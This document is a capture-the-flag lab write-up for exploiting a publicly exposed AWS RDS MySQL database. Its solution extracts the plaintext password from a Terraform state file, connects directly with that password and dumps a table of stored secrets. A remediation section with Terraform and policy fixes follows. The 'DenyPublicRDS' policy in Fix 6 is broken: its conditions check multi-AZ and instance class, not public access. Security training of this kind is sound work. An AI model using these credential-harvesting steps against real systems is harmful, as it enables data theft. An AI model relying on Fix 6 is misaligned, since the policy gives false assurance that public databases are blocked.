# Challenge 06: Publicly Accessible RDS Database

**Difficulty:** 🟡 Medium  
**Category:** Database  
**MITRE ATT&CK:** [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) + [T1213 - Data from Information Repositories](https://attack.mitre.org/techniques/T1213/)

---

## 🎯 Objective

An RDS MySQL database was deployed with `publicly_accessible = true` and a security group open to `0.0.0.0/0` on port 3306. The database credentials were checked into Terraform state. Connect to the database and retrieve the flag from the `app_secrets` table.

---

## 🌍 Setup

```bash
cd challenges/06-public-rds/terraform
terraform init && terraform apply
# Note rds_endpoint, db_username, db_name from output
# Password is in terraform.tfstate (that's part of the challenge)
```

---

## 💡 Hints

<details>
<summary>Hint 1</summary>
Terraform stores all resource attributes — including sensitive ones like passwords — in `terraform.tfstate`. Check the state file.
</details>

<details>
<summary>Hint 2</summary>
The RDS instance is publicly accessible. You can connect directly from your machine using any MySQL client.
</details>

<details>
<summary>Hint 3</summary>
Once connected, enumerate tables in the `appdb` database. Look for secrets tables.
</details>

---

## ✅ Solution

### Step 1 — Extract credentials from Terraform state

```bash
# Terraform state contains the plaintext password
cat terraform.tfstate | python3 -c "
import json,sys
state = json.load(sys.stdin)
for r in state['resources']:
  if r['type'] == 'aws_db_instance':
    attrs = r['instances'][0]['attributes']
    print('Host:', attrs['address'])
    print('User:', attrs['username'])
    print('Pass:', attrs['password'])
"
```

### Step 2 — Connect directly (no VPN needed — it's public)

```bash
mysql -h <rds_endpoint> -u admin -p'Ctf_Passw0rd_2024!' appdb
```

### Step 3 — Enumerate and read the flag

```sql
SHOW TABLES;
-- app_secrets

SELECT * FROM app_secrets;
```

Output:
```
+----+----------------+------------------------------------+---------------------+
| id | key_name       | key_value                          | created_at          |
+----+----------------+------------------------------------+---------------------+
|  1 | stripe_key     | sk_live_exposed_via_public_rds     | 2024-01-01 00:00:00 |
|  2 | flag           | CTF{public_rds_unencrypted_exposed}| 2024-01-01 00:00:00 |
|  3 | admin_password | NotSoSecretAdminPass123            | 2024-01-01 00:00:00 |
+----+----------------+------------------------------------+---------------------+
```

🚩 **Flag:** `CTF{public_rds_unencrypted_exposed}`

---

## 🔍 MITRE ATT&CK Mapping

| Field | Detail |
|---|---|
| Tactic | Initial Access, Collection |
| Technique | T1190 — Exploit Public-Facing Application |
| Technique | T1213 — Data from Information Repositories |
| Detection | VPC Flow Logs: port 3306 connections from external IPs; CloudTrail: `CreateDBInstance` with `PubliclyAccessible=true` |

---

## 🛠️ Remediation

### Fix 1 — Never make RDS publicly accessible

```hcl
resource "aws_db_instance" "secure" {
  publicly_accessible = false  # Always false in production
  # ...
}
```

### Fix 2 — Restrict security group to application tier only

```hcl
resource "aws_security_group" "rds_sg_secure" {
  ingress {
    from_port       = 3306
    to_port         = 3306
    protocol        = "tcp"
    security_groups = [aws_security_group.app_sg.id]  # App SG only, not 0.0.0.0/0
  }
}
```

### Fix 3 — Enable storage encryption

```hcl
resource "aws_db_instance" "secure" {
  storage_encrypted = true
  kms_key_id        = aws_kms_key.rds_key.arn
}
```

### Fix 4 — Use Secrets Manager for the password (not tfvars)

```hcl
resource "aws_secretsmanager_secret" "rds_password" {
  name = "prod/rds/admin-password"
}

resource "aws_db_instance" "secure" {
  manage_master_user_password = true   # AWS manages rotation automatically
}
```

### Fix 5 — Encrypt Terraform state (use remote backend)

```hcl
# Never use local state for production
terraform {
  backend "s3" {
    bucket         = "my-tf-state-bucket"
    key            = "prod/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true        # State encrypted at rest
    kms_key_id     = "alias/terraform-state-key"
    dynamodb_table = "tf-state-lock"
  }
}
```

### Fix 6 — SCP to prevent public RDS instances

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "DenyPublicRDS",
      "Effect": "Deny",
      "Action": ["rds:CreateDBInstance", "rds:ModifyDBInstance"],
      "Resource": "*",
      "Condition": {
        "Bool": {
          "rds:MultiAz": "false"
        },
        "StringEquals": {
          "rds:DatabaseClass": "db.t3.micro"
        }
      }
    }
  ]
}
```

---

## 📚 Further Reading

- [RDS Security Best Practices](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.Security.html)
- [Terraform State Security](https://developer.hashicorp.com/terraform/language/state/sensitive-data)
- [MITRE T1190](https://attack.mitre.org/techniques/T1190/)
